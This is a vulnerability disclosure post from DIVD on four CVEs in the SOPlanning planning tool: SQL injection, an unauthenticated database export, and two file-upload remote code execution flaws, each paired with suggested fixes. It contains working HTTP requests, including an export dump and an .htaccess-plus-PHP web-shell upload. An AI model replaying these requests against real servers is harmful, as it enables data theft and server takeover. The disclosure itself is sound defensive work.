---
layout: post
title: SOPlanning Online Planning tool full disclosure
author: Victor Pasman
researchers:
    - Wietse Boonstra
    - Hidde Smit
    - Max van der Horst
excerpt: "Full disclosure of multiple vulnerabilities discovered in the SOPlanning Online Planning tool"
---
DIVD researchers discovered multiple vulnerabilities in the SOPlanning Online Planning tool (versions < 1.52.02). The vulnerabilities were found by researchers Wietse Boonstra and Hidde Smit, with Max van der Horst as case lead.

DIVD is a CVE Numbering Authority (CNA) and has used these rights to assign the following CVEs to the vulnerabilities described in this case:
- {% cve CVE-2024-27112 %}
- {% cve CVE-2024-27113 %}
- {% cve CVE-2024-27114 %}
- {% cve CVE-2024-27115 %}

The rest of this post contains the full technical write-up of the vulnerabilities.

> **Precondition — public view.** The non-default *public view* setting (`CONFIG_SOPLANNING_OPTION_ACCES` set to `1` or `2`) is the shared precondition for all four issues below. When public view is enabled, a `public=1` request grants a session as the over-privileged `publicspl` user without authenticating (detailed in the IDOR section below), which turns the SQL injection, the database export and the two Remote Code Execution issues into effectively unauthenticated attacks.

## Unauthenticated SQL injection - CVE-2024-27112

- CVE: {% cve CVE-2024-27112 %}
- Case: {% divd DIVD-2024-00024 %}
- Discovered by: Wietse Boonstra and Hidde Smit
- Credits: Discovered by DIVD researchers Wietse Boonstra and Hidde Smit. Case lead: Max van der Horst.
- Products: SOPlanning Online Planning tool (versions < 1.52.02)
- CVSS: To be confirmed against the official CVE record.
- Reference: Case {% divd DIVD-2024-00024 %}, {% cve CVE-2024-27112 %}
- Solution: Use parameterized queries / prepared statements for all user-controllable filter parameters. Update to SOPlanning 1.52.02 or later.

The planning view (`taches.php`) accepts filter parameters that are passed unsanitized into a SQL query. The filter request is handled server-side through the AJAX backend (`process/xajax_server.php`). Both the `gp[]` (group/project filter) and `statut[]` (status filter) parameters are injectable.

As with the other issues, this is reachable without real credentials when public view is enabled: the `public=1` parameter yields a `publicspl` session, and the affected filter functionality must be active. Appending a single quote to `gp[]` breaks out of the query, demonstrating the injection:

```http
POST /soplanning/www/taches.php?public=1 HTTP/1.1
Host: 192.168.1.184:82
Content-Length: 42
Method: POST ./process/xajax_server.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://192.168.1.184:82
Referer: http://192.168.1.184:82/soplanning/www/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: dateDebut=29/05/2024; dateFin=29/07/2024; xposMoisWin=0; xposJoursWin=0; yposMoisWin=0; yposJoursWin=0; baseLigne=users; baseColonne=jours; afficherTableauRecap=1; masquerLigneVide=0; SMARTY_DEBUG=1;soplanningplanning_=9lftp5l5pdlvbu4idqqjim3qcu
Connection: keep-alive

filtreGroupeProjet=1&gp[]=SQLI'&statut[]=1
```

Both `gp[]` (shown here with the `SQLI'` test payload) and `statut[]` are injection points. An attacker can misuse this to read arbitrary information from the underlying database.

**Suggested actions**

Replace string-concatenated queries with parameterized queries / prepared statements for every user-controllable filter, including `gp[]` and `statut[]`. Update to SOPlanning 1.52.02 or later.

## Unauthenticated database export via Insecure Direct Object Reference (IDOR) - CVE-2024-27113

- CVE: {% cve CVE-2024-27113 %}
- Case: {% divd DIVD-2024-00024 %}
- Discovered by: Wietse Boonstra and Hidde Smit
- Credits: Discovered by DIVD researchers Wietse Boonstra and Hidde Smit. Case lead: Max van der Horst.
- Products: SOPlanning Online Planning tool (versions < 1.52.02)
- CVSS: To be confirmed against the official CVE record.
- Reference: Case {% divd DIVD-2024-00024 %}, {% cve CVE-2024-27113 %}
- Solution: Enforce server-side authorization on the backup/export functionality and restrict the `publicspl` account to genuinely read-only access, independent of the public view mode. Update to SOPlanning 1.52.02 or later.

When the non-default public view is enabled and a request contains `public=1`, the application creates a session for the built-in `publicspl` user without any authentication. The relevant logic is in `header.inc`:

```php
// Check Public access
if (isset($_GET['public']) && (CONFIG_SOPLANNING_OPTION_ACCES == 1 || CONFIG_SOPLANNING_OPTION_ACCES == 2)) {
    $_SESSION['public']=1;
    $_SESSION['user_id']='publicspl';
```

The `publicspl` account is expected to be read-only, but in practice it retains extended rights. As a result, an unauthenticated attacker can reach the database backup/export functionality that should be protected. This over-privileged public session is also the shared precondition that turns the two file-upload Remote Code Execution issues below into unauthenticated attacks.

The following request abuses `backup.php` to export the database to CSV. Authentication is bypassed purely through the `public=1` query parameter — note that no session cookie is supplied — and the selected tables (users, configuration, projects, tasks, places, resources) are dumped:

```http
POST /soplanning/www/process/backup.php?public=1 HTTP/1.1
Host: 192.168.1.184:82
Content-Length: 136
Content-Type: application/x-www-form-urlencoded

export_nom_sauvegarde=users_Wb&export_users=1&export_configuration=1&export_projets=1&export_taches=1&export_lieux=1&export_ressources=1
```

Because the export runs under the over-privileged `publicspl` session, an unauthenticated attacker obtains the contents of the underlying database, including user data.

**Suggested actions**

Enforce server-side authorization on the backup/export endpoint so it cannot be invoked from a public/read-only session. Ensure the `publicspl` account cannot perform state-changing or data-exfiltrating actions, and apply authorization checks per action independent of whether public view is active. Update to SOPlanning 1.52.02 or later.

## Unauthenticated Remote Code Execution via unrestricted file upload - CVE-2024-27115

- CVE: {% cve CVE-2024-27115 %}
- Case: {% divd DIVD-2024-00024 %}
- Discovered by: Wietse Boonstra and Hidde Smit
- Credits: Discovered by DIVD researchers Wietse Boonstra and Hidde Smit. 
- Case lead: Max van der Horst.
- Products: SOPlanning Online Planning tool (versions < 1.52.02)
- CVSS: 10.0 (CRITICAL) — vector to be confirmed against the official CVE record.
- Reference: Case {% divd DIVD-2024-00024 %}, {% cve CVE-2024-27115 %}
- Solution: Validate uploaded files server-side against an allowlist of permitted types, store uploads outside the web root, disable script execution in the upload directory, and never honour an uploaded `.htaccess`. Update to SOPlanning 1.52.02 or later.

The upload endpoint (`process/upload.php`) does not restrict the type or extension of uploaded files. Because the uploaded file is written into a web-accessible directory (`www/upload/files/<linkid>/`) under its original filename, an attacker who has a session (obtainable unauthenticated via the public view issue above) can upload a PHP web shell together with a crafted `.htaccess` to make it executable and then request it from the browser.

The vulnerable operation is the move into the web root without any type validation:

```php
move_uploaded_file($tmp_dir, $upload_dir.$filename);
```

The following request uploads both a `.htaccess` (to reset the content handling so the PHP file is served/executed) and a `cmd.php` payload into `www/upload/files/2/`, after which `cmd.php` can be reached directly from the browser:

```http
POST /soplanning/www/process/upload.php HTTP/1.1
Host: 192.168.1.184:82
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Cookie: soplanningplanning_=0c8e9efkm1i17ttc8pq8ni7ivh
Content-Length: 783
Content-Type: multipart/form-data; boundary=e38d5deef1f6a59f1fc2486d2fe81f9c
--e38d5deef1f6a59f1fc2486d2fe81f9c
Content-Disposition: form-data; name="type"
upload
--e38d5deef1f6a59f1fc2486d2fe81f9c
Content-Disposition: form-data; name="linkid"
2
--e38d5deef1f6a59f1fc2486d2fe81f9c
Content-Disposition: form-data; name="type_restauration"
sauvegarde
--e38d5deef1f6a59f1fc2486d2fe81f9c
Content-Disposition: form-data; name="fichier-0"; filename=".htaccess"
Content-Type: application/zip
<Files *.*>
    # Unset the ForceType directive
    RemoveType *
    # Reset Content-Disposition header
    Header unset Content-Disposition
</Files>
--e38d5deef1f6a59f1fc2486d2fe81f9c
Content-Disposition: form-data; name="fichier-1"; filename="cmd.php"
Content-Type: application/zip
<?php phpinfo();?>
--e38d5deef1f6a59f1fc2486d2fe81f9c--
```

Requesting the uploaded `cmd.php` executes the PHP payload on the server (here `phpinfo()`, but any code can be placed instead), resulting in Remote Code Execution.

**Suggested actions**

Enforce a server-side allowlist of permitted file types and reject dangerous extensions (including `.php`, `.phtml`, and `.htaccess`). Store uploads outside the web root or in a directory where script execution is disabled, and generate server-controlled filenames. Update to SOPlanning 1.52.02 or later.

## Unauthenticated Remote Code Execution via TOCTOU race condition in file upload - CVE-2024-27114

- CVE: {% cve CVE-2024-27114 %}
- Case: {% divd DIVD-2024-00024 %}
- Discovered by: Wietse Boonstra and Hidde Smit
- Credits: Discovered by DIVD researchers Wietse Boonstra and Hidde Smit. Case lead: Max van der Horst.
- Products: SOPlanning Online Planning tool (versions < 1.52.02)
- CVSS: 10.0 (CRITICAL) — vector to be confirmed against the official CVE record.
- Reference: Case {% divd DIVD-2024-00024 %}, {% cve CVE-2024-27114 %}
- Solution: Validate the uploaded file before it is placed in any web-accessible location; do not use a move-then-delete pattern. Move the file to a non-executable temporary location, validate it there, and only then expose it. Update to SOPlanning 1.52.02 or later.

The same upload handling contains a Time-of-check Time-of-use (TOCTOU) race condition. The uploaded file is moved into the destination directory *before* the requirements are (fully) verified, and is only removed afterwards with `@unlink()`. This leaves a window in which the file physically exists in the web-accessible directory and can be triggered by the attacker before it is deleted, again leading to code execution.

The upload directory is web-accessible. It is defined in `config.inc`:

```php
define('UPLOAD_DIR', BASE . '/../www/upload/files/'); // upload file directory, must have read/write access
```

The code flow is as follows:

1. The uploaded file is first stored in `$tmp_dir` — PHP's default temporary upload location (the specific path is irrelevant to the exploit).
2. `move_uploaded_file($tmp_dir, $upload_dir.$filename)` moves the file straight from `$tmp_dir` into the web-accessible `$upload_dir` under its original filename — **before any validation of the file's contents or type.**
3. Only *after* the move does the code run its checks, verifying whether the uploaded files are ZIP or CSV files intended for a database restore.
4. Finally the code removes the file again with `@unlink($upload_dir.$filename)`.

Because step 2 places the file in the public directory before the checks in step 3 and the cleanup in step 4, an attacker who uploads a `.php` file and simultaneously requests it has a chance to execute it during the window in which it exists on disk. This is the race that constitutes the RCE.

> **Note (unverified observation):** The post-move checks accept ZIP files for use in a database restore. Handling attacker-controlled archives this way may expose a Zip Slip (path traversal on extraction) issue. This was not verified and is noted here only as a follow-up item to investigate; it should not be presented as a confirmed finding without validation.

The relevant flow in the upload code:

```php
$type=$_POST['type'];
$type_restauration=$_POST['type_restauration'];
$type_fichier_import_seul=$_POST['type_fichier_import'];
$upload_dir = SAVE_DIR; // upload directory
// Si on fait un upload de fichiers
if ($type=='upload')
{
// Pour tous les fichiers, on tente de les uploader
	for($i=0; $i<count($_FILES); $i++){
	  $filename = replaceAccents(utf8_decode($_FILES["fichier-$i"]['name']));
	  $tmp_dir = $_FILES["fichier-$i"]['tmp_name'];
	  $fileSize = $_FILES["fichier-$i"]['size'];

      $dest_dir=$upload_dir.$filename.".tmp";

// SNIP

  if(!file_exists(SAVE_DIR) || !is__writable(SAVE_DIR)) {
		//SNIP ERROR MESSAGE
		exit;
	}else
	{

	    //SNIP SOME CHECKS

		// Chargement du fichier
		if(!(move_uploaded_file($tmp_dir,$upload_dir.$filename)))
		{

// SNIP rest of code cause not important for exploiting it. Except the @unlink()

				// Suppression des fichiers
				@unlink($upload_dir.$filename);
				//@rrmdir($dest_dir);
```

Because the file is written to the web-accessible upload directory before validation and only cleaned up with `@unlink()` afterwards, an attacker can race the deletion and request the uploaded payload during the window in which it exists, achieving Remote Code Execution. The same upload request shown for CVE-2024-27115 can be used to place the payload; the difference is the exploited weakness (the move-before-check / delete-after race rather than the absence of type validation).

**Suggested actions**

Do not move uploaded files into a web-accessible location before validation. Validate content in a temporary, non-executable directory and only publish the file after all checks pass. Avoid move-then-`unlink()` cleanup patterns that leave a race window. Update to SOPlanning 1.52.02 or later.

## More information

* {% cve CVE-2024-27112 %}
* {% cve CVE-2024-27113 %}
* {% cve CVE-2024-27114 %}
* {% cve CVE-2024-27115 %}
* [National Vulnerability Database for CVE-2024-27112](https://nvd.nist.gov/vuln/detail/CVE-2024-27112)
* [National Vulnerability Database for CVE-2024-27113](https://nvd.nist.gov/vuln/detail/CVE-2024-27113)
* [National Vulnerability Database for CVE-2024-27114](https://nvd.nist.gov/vuln/detail/CVE-2024-27114)
* [National Vulnerability Database for CVE-2024-27115](https://nvd.nist.gov/vuln/detail/CVE-2024-27115)
